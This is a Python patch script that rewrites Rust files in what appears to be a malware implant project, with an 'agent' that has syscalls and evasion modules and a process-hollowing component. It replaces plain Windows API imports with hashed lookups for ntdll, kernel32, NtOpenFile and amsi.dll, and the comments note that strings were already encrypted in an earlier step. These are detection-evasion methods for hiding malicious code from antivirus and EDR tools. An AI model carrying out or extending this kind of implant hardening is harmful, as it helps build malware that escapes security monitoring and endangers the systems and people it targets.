import os
import re

def process_file(filepath):
    if not os.path.exists(filepath): return
    with open(filepath, 'r') as f:
        content = f.read()

    # GetModuleHandleA replacements
    # We replaced ntdll.dll with string crypt, so it might look like GetModuleHandleA(string_crypt::enc_str!("ntdll.dll").as_ptr() as _) or similar. Let's just find the GetModuleHandleA calls.
    # Note: we need to replace winapi::um::libloaderapi::GetModuleHandleA to pe_resolve::get_module_handle_by_hash and winapi::um::libloaderapi::GetProcAddress to pe_resolve::get_proc_address_by_hash.
    
    # Replace GetModuleHandleA calls manually in known files. 
    # Due to complexity of exactly matching syntax, regex might break. Let's do raw text substitutions where we can.
    if 'syscalls.rs' in filepath:
        content = content.replace(
            'winapi::um::libloaderapi::GetModuleHandleA(string_crypt::enc_str!("ntdll.dll").as_ptr() as *const i8)',
            'pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as *mut _'
        )
        content = content.replace(
            'winapi::um::libloaderapi::GetProcAddress(ntdll, string_crypt::enc_str!("NtOpenFile").as_ptr() as *const i8)',
            'pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTOPENFILE).unwrap_or(0) as *mut _'
        )
        content = content.replace(
            'winapi::um::libloaderapi::GetModuleHandleA(string_crypt::enc_str!("kernel32.dll").as_ptr() as *const i8)',
            'pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL).unwrap_or(0) as *mut _'
        )
        
        # Replace mapping macros in map_clean_ntdll
        content = re.sub(
            r'winapi::um::libloaderapi::GetProcAddress\(\s*ntdll,\s*string_crypt::enc_str!\("(.*?)"\)\.as_ptr\(\) as \_\s*\)',
            r"pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_\1).unwrap_or(0) as _",
            content,
            flags=re.IGNORECASE
        )

    if 'evasion.rs' in filepath:
        content = content.replace(
            'winapi::um::libloaderapi::GetModuleHandleA(string_crypt::enc_str!("amsi.dll").as_ptr() as _)',
            'pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_AMSI_DLL).unwrap_or(0) as _'
        )
        content = content.replace(
            'winapi::um::libloaderapi::GetModuleHandleA(string_crypt::enc_str!("ntdll.dll").as_ptr() as _)',
            'pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _'
        )
        content = re.sub(
            r'winapi::um::libloaderapi::GetProcAddress\(\s*(.*?),\s*string_crypt::enc_str!\("(.*?)"\)\.as_ptr\(\) as \_\s*\)',
            r"pe_resolve::get_proc_address_by_hash(\1 as usize, pe_resolve::HASH_\2).unwrap_or(0) as _",
            content,
            flags=re.IGNORECASE
        )

    with open(filepath, 'w') as f:
        f.write(content)
    print(f"Patched {filepath}")

for f in ["agent/src/syscalls.rs", "agent/src/evasion.rs", "hollowing/src/windows_impl.rs"]:
    process_file(f)
